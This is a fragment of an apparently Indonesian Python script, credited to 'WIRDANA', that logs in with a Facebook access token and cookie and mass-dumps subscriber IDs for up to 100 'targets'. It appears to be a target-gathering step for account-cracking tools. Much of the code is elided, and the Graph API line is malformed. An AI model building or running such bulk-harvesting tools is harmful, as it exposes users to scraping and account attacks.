...
\t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]    	
			{m}•{k}•{h}•{sir} Author : WIRDANA {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> Mau Berapa Target BABI ? : '))
	except ValueError:
		print('>> Masukkan Angka BABI, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
	...
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/100013261902810?fields=subscribers&access_token=%s'+tokenku[0], cookies = {'cookies':cok}).json()
